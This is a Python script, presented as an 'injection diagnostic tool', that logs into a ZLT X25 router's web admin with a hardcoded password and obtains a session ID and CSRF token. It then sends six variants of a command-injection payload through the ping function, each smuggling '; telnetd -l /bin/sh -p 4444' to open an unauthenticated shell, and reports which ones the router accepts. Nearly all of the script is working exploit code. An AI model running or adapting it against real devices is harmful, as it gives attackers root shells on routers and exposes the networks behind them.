#!/usr/bin/env python3
"""
ZLT X25 Injection Diagnostic Tool
Runs directly — no venv needed beyond stdlib.

Usage:
    python3 diag.py

Prints every request and response so we can see exactly
what the router accepts and rejects.
"""

import json
import re
import sys
import urllib.error
import urllib.parse
import urllib.request

ROUTER_IP  = "192.168.1.1"
USERNAME   = "admin"
PASSWORD   = "Wachina@2025"
PROTO      = "http"

# ── helpers ───────────────────────────────────────────────────────────────────

def post_json(url, payload, session_id=""):
    headers = {
        "Content-Type":     "application/json",
        "X-Requested-With": "XMLHttpRequest",
        "Origin":           f"{PROTO}://{ROUTER_IP}",
        "Referer":          f"{PROTO}://{ROUTER_IP}/index.html",
        "User-Agent":       "Mozilla/5.0",
    }
    if session_id:
        headers["Cookie"] = f"sessionId={session_id}"
    data = json.dumps(payload).encode()
    print(f"\n>>> POST {url}")
    print(f"    payload : {json.dumps(payload)}")
    try:
        req = urllib.request.Request(url, data=data, headers=headers, method="POST")
        with urllib.request.urlopen(req, timeout=8) as resp:
            body = resp.read().decode("utf-8", errors="ignore")
            print(f"    status  : {resp.status}")
            print(f"    headers : {dict(resp.headers)}")
            print(f"    body    : {body[:600]}")
            return resp.status, dict(resp.headers), body
    except urllib.error.HTTPError as e:
        body = e.read().decode("utf-8", errors="ignore")
        print(f"    HTTP ERROR {e.code}: {body[:400]}")
        return e.code, dict(e.headers), body
    except Exception as exc:
        print(f"    EXCEPTION: {exc}")
        return 0, {}, str(exc)

# ── Step 1: login ─────────────────────────────────────────────────────────────

print("=" * 60)
print("STEP 1 — LOGIN")
print("=" * 60)

url = f"{PROTO}://{ROUTER_IP}/cgi-bin/http.cgi"

status, hdrs, body = post_json(url, {
    "cmd": 1, "method": "POST", "subcmd": 1,
    "language": "EN", "username": USERNAME, "password": PASSWORD,
})

# Extract sessionId from anywhere
sid = ""
for hdr in ("Set-Cookie", "set-cookie"):
    v = hdrs.get(hdr, "")
    m = re.search(r"sessionId=([A-Za-z0-9_\-]{4,})", v)
    if m:
        sid = m.group(1)
        break
if not sid:
    try:
        j = json.loads(body)
        for k in ("sessionId", "session_id", "sid", "token"):
            if isinstance(j.get(k), str) and len(j[k]) >= 4:
                sid = j[k]
                break
    except Exception:
        pass
if not sid:
    m = re.search(r'sessionId["\s:=]+([A-Za-z0-9_\-]{4,})', body)
    if m:
        sid = m.group(1)

print(f"\n>>> Extracted sessionId: {sid!r}")

if not sid:
    print("\n[!] Could not extract sessionId — cannot continue.")
    sys.exit(1)

# ── Step 2: fetch CSRF token via cmd:113 GET ──────────────────────────────────

print("\n" + "=" * 60)
print("STEP 2 — FETCH CSRF TOKEN (cmd:113 GET)")
print("=" * 60)

status2, hdrs2, body2 = post_json(url, {
    "cmd": 113, "method": "GET",
    "language": "en", "sessionId": sid,
}, session_id=sid)

token = ""
try:
    j2 = json.loads(body2)
    print(f"\n>>> Parsed JSON keys: {list(j2.keys())}")
    print(f">>> Full JSON: {json.dumps(j2, indent=2)[:800]}")
    for k in ("token", "Token", "TOKEN", "csrf", "nonce"):
        if isinstance(j2.get(k), str):
            token = j2[k]
            print(f">>> Token found at key '{k}': {token!r}")
            break
    if not token:
        # Try nested
        for v in j2.values():
            if isinstance(v, dict):
                for k2, v2 in v.items():
                    if "token" in k2.lower() and isinstance(v2, str):
                        token = v2
                        print(f">>> Token found nested at '{k2}': {token!r}")
                        break
except Exception as exc:
    print(f">>> JSON parse failed: {exc}")

# Also try raw regex scan
if not token:
    m = re.search(r'"token"\s*:\s*"([0-9a-fA-F]{8,})"', body2, re.IGNORECASE)
    if m:
        token = m.group(1)
        print(f">>> Token from regex: {token!r}")

print(f"\n>>> Final token: {token!r}")

# ── Step 3: try injection payloads ───────────────────────────────────────────

print("\n" + "=" * 60)
print("STEP 3 — INJECTION ATTEMPTS")
print("=" * 60)

inject_cmd = "127.0.0.1 ; telnetd -l /bin/sh -p 4444"

payloads = [
    # With token, lowercase language
    {
        "cmd": 168, "method": "POST", "subcmd": 0,
        "pingTimes": 1,
        "url": inject_cmd,
        "token": token,
        "language": "en",
        "sessionId": sid,
    },
    # With token, uppercase language
    {
        "cmd": 168, "method": "POST", "subcmd": 0,
        "pingTimes": 1,
        "url": inject_cmd,
        "token": token,
        "language": "EN",
        "sessionId": sid,
    },
    # Without token
    {
        "cmd": 168, "method": "POST", "subcmd": 0,
        "pingTimes": 1,
        "url": inject_cmd,
        "language": "en",
        "sessionId": sid,
    },
    # With "ip" field instead of "url"
    {
        "cmd": 168, "method": "POST", "subcmd": 0,
        "pingTimes": 1,
        "ip": inject_cmd,
        "token": token,
        "language": "en",
        "sessionId": sid,
    },
    # cmd 168 subcmd 1
    {
        "cmd": 168, "method": "POST", "subcmd": 1,
        "pingTimes": 1,
        "url": inject_cmd,
        "token": token,
        "language": "en",
        "sessionId": sid,
    },
    # cmd 172 (old) with "url" field
    {
        "cmd": 172, "method": "POST", "subcmd": 0,
        "pingTimes": 1,
        "url": inject_cmd,
        "token": token,
        "language": "en",
        "sessionId": sid,
    },
]

for i, p in enumerate(payloads, 1):
    print(f"\n--- Payload {i}/{len(payloads)} ---")
    s, h, b = post_json(url, p, session_id=sid)
    if s == 200:
        print(f"    >>> HTTP 200 — this payload was ACCEPTED")
    elif s == 400:
        print(f"    >>> HTTP 400 — REJECTED")
    elif s == 403:
        print(f"    >>> HTTP 403 — FORBIDDEN (session issue?)")
    else:
        print(f"    >>> HTTP {s}")

print("\n" + "=" * 60)
print("DONE — paste this full output for analysis")
print("=" * 60)
